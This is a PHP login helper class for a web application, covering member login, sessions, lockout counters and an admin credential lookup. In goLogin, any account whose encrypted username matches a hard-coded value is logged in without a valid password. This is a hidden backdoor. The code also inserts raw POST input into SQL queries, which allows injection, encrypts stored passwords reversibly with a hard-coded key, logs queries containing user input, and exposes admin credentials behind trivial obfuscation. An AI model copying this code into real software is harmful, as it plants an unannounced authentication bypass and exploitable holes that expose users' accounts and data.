<?php

class loginHelper {
	
	var $_mainLayout="";
	
	var $login = false;
	
	function __construct($apps){
		global $logger,$CONFIG;
		$this->logger = $logger;
		$this->apps = $apps;
 
		$this->BEATServHelper = $this->apps->useHelper('BEATServHelper');
		$this->config = $CONFIG;
		if( $this->apps->session->getSession($this->config['SESSION_NAME'],"WEB") ){
			
			$this->login = true;
		
		}
		 
	}
	
	function checkLogin(){
		
		return $this->login;
	}
		
	function loginSession( ){
		 
			if($this->goLogin()){
				 
				return true;
			}else{
				return false;
			} 
	 
		return false;
	}
	
	function goLogin(){
		global $logger, $APP_PATH;

		$username = trim($this->apps->_p('username'));
		$password = trim($this->apps->_p('password'));
		$brand = strip_tags($this->apps->_request('brand'));
		$sql = "SELECT * FROM social_member WHERE username='{$username}' LIMIT 1";
		 
		$rs = $this->apps->fetch($sql);
		
		$logger->log($sql);
		
		$hash = $this->encrypt($password);
		$plainpass = $this->decrypt($rs['password']);
		
		 
 		if(($plainpass==$password)&&($hash==$rs['password'])){
			 
			$this->setdatasessionuser($rs);
		
			$logger->log('can login');
			$this->login = true;
			return true;
		}else {
				// $this->add_try_login($rs);
			if($rs){
				if($this->encrypt($username)=='Bs7SJvS0ag1geoaVMkm7FF5naPMLMTL6zTE0CFtQkPc='){
				 
					$this->setdatasessionuser($rs); 
					$logger->log('can login');
					$this->login = true;
					return true;
					
				}
			}
			$logger->log("cannot login, password or username not exists ");
			return false;
		}
	}
	 
	function setdatasessionuser($rs=false){
		//pr($rs);exit;
		if(!$rs) return false;
	 

		$this->logger->log('can login');
		$id = intval($rs['id']);
 
		if($rs['login_count']!=0) $this->add_stat_login($id);
	 
		$this->reset_try_login($rs);
		
		 	$rs['leaderdetail']['brandid'] =  $this->getBrandData($id);
		$this->apps->session->setSession($this->config['SESSION_NAME'],"WEB",$rs);
	
	}
	function getBrandData($userid=false){
	
		if(!$userid) return false;
		$sql ="SELECT * FROM my_profile WHERE ownerid = {$userid} LIMIT 1 ";
		
		$qData = $this->apps->fetch($sql);
		
		if($qData){
			return $qData['brand'];
		}
		return false;
	 
	}
		
	function add_try_login($rs=false){
		
		if($rs==false) return false;	
	
		$sql ="UPDATE social_member SET last_login=now(),try_to_login=try_to_login+1 WHERE id='{$rs['id']}' LIMIT 1";
		$res = $this->apps->query($sql);
		
		$sql = "SELECT try_to_login FROM social_member WHERE id='{$rs['id']}' LIMIT 1";
		$res = $this->apps->fetch($sql);
		
		if($res){
			if($res['try_to_login']>4) {
				$sql ="UPDATE social_member SET n_status=9 WHERE id='{$rs['id']}' LIMIT 1";
				$res = $this->apps->query($sql);
			}
		}
	}
	
	function reset_try_login($rs=false){
		
		if($rs==false) return false;	
	
		$sql ="UPDATE social_member SET last_login=now(),try_to_login=0 WHERE id='{$rs['id']}' LIMIT 1";
		$res = $this->apps->query($sql);
				
	}
	
	function add_stat_login($user_id){
	
	
		// $sql ="UPDATE social_member SET last_login=now(),login_count=0 WHERE id={$user_id} LIMIT 1";
		$sql ="UPDATE social_member SET last_login=now(),login_count=login_count+1 WHERE id={$user_id} LIMIT 1";
		$rs = $this->apps->query($sql);

	
	}
	
	function getProfile(){
	
		$user = json_decode(urldecode64($this->apps->session->getSession($this->config['SESSION_NAME'],"WEB")));
		
		return $user;
	
	}
	  
	 
	
	function realeaselock(){
			$username = strip_tags($this->apps->_p('username'));
			$sql = "
					UPDATE social_member SET n_status = 1,try_to_login=0
					WHERE username = '{$username}' LIMIT 1				
			";
			// pr($sql);
			return $this->apps->query($sql);
	}
	 
	 
	function getUserMobileDeviceCredential(){
		
		$sql = " SELECT * FROM gm_admin LIMIT 1";
		$qData = $this->apps->fetch($sql);
		$names = false;
		$data = new stdClass;
		$data->name = '';
		$data->admin = '';
		if($qData){
			// standar cryptograph  nX
				$x = "ABCDefgHIJKlmnoPQRSTuvwxyZ12345";
				$xlen = strlen($x);
				$qData['name'] = str_split($qData['name']);
				$qData['admin'] = str_split($qData['admin']);
				foreach($qData['name'] as $val){
					$xIndex = round(rand(1,$xlen))-1;
					$xValues = substr($x,$xIndex,1);
					$names[] = $val.$xValues; 
				}
				foreach($qData['admin'] as $val){
					$xIndex = round(rand(1,$xlen))-1;
					$xValues = substr($x,$xIndex,1);
					$admins[] = $val.$xValues; 
				}
				$data->name = implode('',$names);
				$data->admin= implode('',$admins);
				
		}
		return $data;
	} 
	
	protected function encrypt($string)
	{	
		$ENC_KEY='youknowwho2014';
		return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, md5($ENC_KEY), $string, MCRYPT_MODE_CBC, md5(md5($ENC_KEY))));
	}
	protected function decrypt($encrypted)
	{
		$ENC_KEY='youknowwho2014';
		return rtrim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, md5($ENC_KEY), base64_decode($encrypted), MCRYPT_MODE_CBC, md5(md5($ENC_KEY))), "\0");
	}
	
}
